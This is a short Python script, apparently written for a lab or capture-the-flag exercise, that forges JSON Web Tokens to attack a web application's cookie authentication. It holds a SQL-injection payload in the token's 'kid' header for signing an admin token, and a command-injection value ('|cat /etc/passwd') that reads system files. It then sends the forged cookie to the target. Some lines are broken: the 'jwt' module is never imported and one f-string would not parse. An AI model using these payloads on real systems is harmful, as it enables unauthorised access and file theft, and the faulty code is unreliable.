#!/usr/bin/env python3

'''
Topic: JSON Web Token
Author: @eshaan7 (github, linkedin)
'''

import requests
import base64
from bs4 import BeautifulSoup

# original cookie decoding
url = ""
auth_cookie = requests.get(url=url).cookies.get('auth')
jwt_list = [base64.urlsafe_b64decode(x+"========") for x in auth_cookie.rsplit('.')]

# verbose data
print('[+] Orignal JWT cookie:', auth_cookie,'\n---------------')
print('[+] Orignal JWT:', '.'.join(map(str,jwt_list)),'\n---------------')

'''
## 1. SQLi in Kid parameter

key = 'hacked'
kid = "hahaha\' UNION SELECT \'hacked" or "hahaha\' UNION SELECT \'hacked\' limit 1,1--"
## SELECT key from keys WHERE kid='hahaha' UNION SELECT 'hacked' limit 1,1 --

# Generating malicious JWT
new_JWT = jwt.encode({"user": "admin"}, key=key, algorithm="HS256", headers={"kid": f"{kid}"}).decode("utf-8", errors="ignore")

'''

## 2. Ruby On Rails RCE
kid = "|cat /etc/passwd"

# Generating malicious JWT
jwt_list[0] = f'{"typ":"JWT","alg":"HS256","kid":{kid}}'.encode('utf-8')
new_JWT = '.'.join([base64.urlsafe_b64encode(x).decode("utf-8", errors="ignore").rstrip('=') for x in jwt_list])

# verbose data
print('[+] New JWT:','.'.join(map(str,jwt_list)), '\n---------------')
print('[+] New JWT cookie:',new_JWT, '\n---------------')

# Replacing auth cookie with new one
r = requests.get(url=url, cookies={ 'auth': new_JWT } )
print(r.text)

## Or beautfiul Soup
'''
soup = BeautifulSoup(r.text, 'html.parser')
print('[+] Authentication Status:')
[ print(x.text) for x in soup.findAll("div", {"class": "alert"}) ]
print('\n---------------')
'''             